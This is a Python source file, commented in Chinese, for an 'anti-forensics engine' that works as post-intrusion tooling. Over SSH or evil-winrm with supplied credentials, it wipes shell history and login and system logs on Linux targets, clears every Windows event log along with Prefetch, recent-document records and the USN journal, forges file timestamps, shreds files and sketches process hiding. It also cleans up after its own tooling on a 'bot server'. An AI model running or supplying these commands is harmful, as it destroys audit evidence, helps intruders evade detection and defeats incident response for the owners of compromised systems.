"""
反取证/痕迹清理引擎 v1.0 — Anti-Forensics & Trace Cleanup
───────────────────────────────────────────
覆盖:
  • Linux: history清理/日志清空(wtmp/btmp/syslog/auth)/时间戳篡改/文件粉碎/进程隐藏
  • Windows: 事件日志清理(PowerShell/wevtutil)/Prefetch清理/USN Journal/最近文档/回收站
  • 通用: 敏感文件安全删除(shred/DD)

工具依赖: shred, srm, find, sed, awk, wevtutil, powershell
"""

import subprocess, os, time, shutil
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum


class CleanTarget(Enum):
    HISTORY = "history"
    LOGS = "system_logs"
    TIMESTAMP = "timestamp"
    FILE_SHRED = "file_shred"
    WINDOWS_EVENT = "windows_event"
    WINDOWS_PREFETCH = "prefetch"
    WINDOWS_RECENT = "recent_docs"
    WINDOWS_RECYCLE = "recycle_bin"


@dataclass
class CleanResult:
    target: str
    status: str
    detail: str


# ==================== Linux 痕迹清理 ====================

LINUX_CLEAN_COMMANDS = {
    "history": [
        # 清空当前 shell history
        "history -c",
        "history -w",
        # 删除 history 文件
        "rm -f ~/.bash_history ~/.zsh_history ~/.python_history ~/.mysql_history ~/.psql_history 2>/dev/null",
        # 写入空 history
        "echo > ~/.bash_history 2>/dev/null",
        # 禁止 history 记录(当前会话)
        "export HISTSIZE=0",
        "export HISTFILE=/dev/null",
        "unset HISTFILE",
    ],
    "logs": [
        # wtmp/btmp(登录记录)
        "> /var/log/wtmp 2>/dev/null",
        "> /var/log/btmp 2>/dev/null",
        # syslog/auth.log
        "> /var/log/syslog 2>/dev/null",
        "> /var/log/auth.log 2>/dev/null",
        "> /var/log/messages 2>/dev/null",
        "> /var/log/secure 2>/dev/null",
        # 通配清空
        "find /var/log -type f -name '*.log' -exec truncate -s 0 {} \\; 2>/dev/null",
        # journalctl
        "journalctl --rotate 2>/dev/null && journalctl --vacuum-time=1s 2>/dev/null",
        # lastlog
        "> /var/log/lastlog 2>/dev/null",
    ],
    "timestamp": [
        # 篡改文件时间戳(伪造访问/修改时间)
        # touch -t [[CC]YY]MMDDhhmm[.ss]
        "touch -t 202001010000.00 {filepath}",
        # 参考另一个文件的时间戳
        # touch -r /etc/passwd {filepath}
    ],
    "file_shred": [
        # shred 安全删除(3次覆盖+随机)
        "shred -u -z -n 3 {filepath} 2>/dev/null",
        # 回退: dd 覆盖
        "dd if=/dev/urandom of={filepath} bs=1M count=1 2>/dev/null; rm -f {filepath}",
    ],
    "process_hide": [
        # 隐藏进程(LD_PRELOAD / 修改 /proc)
        # 需要 root, 提供思路而非执行
        "mount -o bind /tmp/empty /proc/{pid} 2>/dev/null",
    ],
}

# ==================== Windows 痕迹清理 ====================

WINDOWS_CLEAN_COMMANDS = {
    "event_logs": [
        # 清空所有事件日志
        "for /F \"tokens=*\" %1 in ('wevtutil el') do wevtutil cl \"%1\"",
        # PowerShell 版
        "powershell -c \"Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }\"",
        # 安全日志(需管理员)
        "wevtutil cl Security",
        "wevtutil cl System",
        "wevtutil cl Application",
    ],
    "prefetch": [
        # Prefetch 清理
        "del /f /q C:\\Windows\\Prefetch\\*.* 2>nul",
    ],
    "recent_docs": [
        # 最近文档
        "del /f /q \"%APPDATA%\\Microsoft\\Windows\\Recent\\*.*\" 2>nul",
        # 运行历史
        "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f 2>nul",
    ],
    "recycle_bin": [
        # 清空回收站
        "powershell -c \"Clear-RecycleBin -Force\"",
        "rd /s /q C:\\$Recycle.Bin 2>nul",
    ],
    "usn_journal": [
        # USN Journal 清理(NTFS 变更日志)
        "fsutil usn deletejournal /d C: 2>nul",
    ],
    "timestamps": [
        # 修改文件时间戳
        "powershell -c \"(Get-Item '{filepath}').CreationTime='2020-01-01'; (Get-Item '{filepath}').LastWriteTime='2020-01-01'; (Get-Item '{filepath}').LastAccessTime='2020-01-01'\"",
    ],
    "file_shred": [
        # cipher 覆盖空闲空间
        "cipher /w:C:\\ 2>nul",
        # SDelete(需下载)
        "sdelete -p 3 -s {filepath} 2>nul",
    ],
}


class AntiForensicsEngine:
    """反取证引擎: 清理痕迹 + 时间戳篡改 + 文件粉碎"""

    def __init__(self):
        pass

    # ============ Linux ============

    def clean_history(self, target: str = "", credential: str = "", keyfile: str = "") -> List[CleanResult]:
        """清理命令历史"""
        return self._run_linux(target, credential, keyfile, LINUX_CLEAN_COMMANDS["history"])

    def clean_logs(self, target: str = "", credential: str = "", keyfile: str = "") -> List[CleanResult]:
        """清理系统日志"""
        return self._run_linux(target, credential, keyfile, LINUX_CLEAN_COMMANDS["logs"])

    def clean_all_linux(self, target: str = "", credential: str = "", keyfile: str = "") -> List[CleanResult]:
        """一键清理所有 Linux 痕迹"""
        results = []
        results.extend(self.clean_history(target, credential, keyfile))
        results.extend(self.clean_logs(target, credential, keyfile))
        return results

    def falsify_timestamp(self, filepath: str, target: str = "",
                          credential: str = "", keyfile: str = "") -> CleanResult:
        """篡改文件时间戳"""
        cmd = f"touch -t 202001010000.00 {filepath}"
        return self._exec_single(target, credential, keyfile, cmd, "timestamp")

    def shred_file(self, filepath: str, target: str = "",
                   credential: str = "", keyfile: str = "") -> CleanResult:
        """安全删除文件(3次覆盖)"""
        cmd = f"shred -u -z -n 3 {filepath} 2>/dev/null || (dd if=/dev/urandom of={filepath} bs=1M count=1 2>/dev/null; rm -f {filepath})"
        return self._exec_single(target, credential, keyfile, cmd, "file_shred")

    # ============ Windows ============

    def clean_windows_eventlogs(self, target: str = "", credential: str = "") -> List[CleanResult]:
        """清空 Windows 事件日志"""
        return self._run_windows(target, credential, WINDOWS_CLEAN_COMMANDS["event_logs"])

    def clean_windows_prefetch(self, target: str = "", credential: str = "") -> List[CleanResult]:
        """清理 Prefetch"""
        return self._run_windows(target, credential, WINDOWS_CLEAN_COMMANDS["prefetch"])

    def clean_windows_recent(self, target: str = "", credential: str = "") -> List[CleanResult]:
        """清理最近文档和运行历史"""
        results = []
        results.extend(self._run_windows(target, credential, WINDOWS_CLEAN_COMMANDS["recent_docs"]))
        results.extend(self._run_windows(target, credential, WINDOWS_CLEAN_COMMANDS["recycle_bin"]))
        return results

    def clean_all_windows(self, target: str = "", credential: str = "") -> List[CleanResult]:
        """一键清理所有 Windows 痕迹"""
        results = []
        results.extend(self.clean_windows_eventlogs(target, credential))
        results.extend(self.clean_windows_prefetch(target, credential))
        results.extend(self.clean_windows_recent(target, credential))
        results.extend(self._run_windows(target, credential, WINDOWS_CLEAN_COMMANDS["usn_journal"]))
        return results

    # ============ 本地清理(在 bot 运行的服务器上) ============

    def clean_local(self) -> Dict:
        """清理本地(bot服务器)痕迹"""
        results = []
        # 清理本地 history
        for f in [os.path.expanduser("~/.bash_history"),
                  os.path.expanduser("~/.zsh_history")]:
            if os.path.exists(f):
                try:
                    os.remove(f)
                    results.append(f"deleted {f}")
                except Exception as e:
                    results.append(f"failed {f}: {e}")
        # 清理 /tmp 下的工具输出
        for pat in ["/tmp/rt_*.txt", "/tmp/nm_*", "/tmp/privesc/*"]:
            try:
                subprocess.run(f"rm -f {pat}", shell=True, timeout=5)
            except Exception:
                pass
        return {"status": "ok", "cleaned": results}

    # ============ 内部执行 ============

    def _exec_single(self, target, credential, keyfile, cmd, name) -> CleanResult:
        if target:
            full = self._build_ssh(target, credential, keyfile) + f" '{cmd}'"
        else:
            full = cmd
        try:
            r = subprocess.run(full, shell=True, capture_output=True, text=True, timeout=30)
            return CleanResult(name, "ok" if r.returncode == 0 else "fail",
                               (r.stdout + r.stderr)[:300])
        except Exception as e:
            return CleanResult(name, "error", str(e))

    def _run_linux(self, target, credential, keyfile, cmds) -> List[CleanResult]:
        return [self._exec_single(target, credential, keyfile, c, "linux_clean") for c in cmds]

    def _run_windows(self, target, credential, cmds) -> List[CleanResult]:
        results = []
        for c in cmds:
            if target:
                full = f"evil-winrm -i {target} "
                if credential and ":" in credential:
                    u, p = credential.split(":", 1)
                    full += f"-u {u} -p {p} "
                full += f"-e '{c}'"
            else:
                full = c
            try:
                r = subprocess.run(full, shell=True, capture_output=True, text=True, timeout=30)
                results.append(CleanResult("windows_clean", "ok" if r.returncode == 0 else "fail",
                                           (r.stdout + r.stderr)[:300]))
            except Exception as e:
                results.append(CleanResult("windows_clean", "error", str(e)))
        return results

    def _build_ssh(self, target, credential, keyfile) -> str:
        cmd = "ssh -o StrictHostKeyChecking=no "
        if keyfile:
            cmd += f"-i {keyfile} "
        if credential and ":" in credential:
            u, _ = credential.split(":", 1)
            cmd += f"{u}@{target} "
        else:
            cmd += f"{target} "
        return cmd


# ==================== 便捷函数 ====================

def clean_linux(target: str = "", credential: str = "", keyfile: str = "") -> List[Dict]:
    """一键清理 Linux 痕迹"""
    return [r.__dict__ for r in AntiForensicsEngine().clean_all_linux(target, credential, keyfile)]


def clean_windows(target: str = "", credential: str = "") -> List[Dict]:
    """一键清理 Windows 痕迹"""
    return [r.__dict__ for r in AntiForensicsEngine().clean_all_windows(target, credential)]


def clean_local() -> Dict:
    """清理本地 bot 服务器痕迹"""
    return AntiForensicsEngine().clean_local()


def falsify_timestamp(filepath: str, target: str = "", credential: str = "", keyfile: str = "") -> Dict:
    """篡改文件时间戳"""
    return AntiForensicsEngine().falsify_timestamp(filepath, target, credential, keyfile).__dict__


def shred_file(filepath: str, target: str = "", credential: str = "", keyfile: str = "") -> Dict:
    """安全删除文件"""
    return AntiForensicsEngine().shred_file(filepath, target, credential, keyfile).__dict__
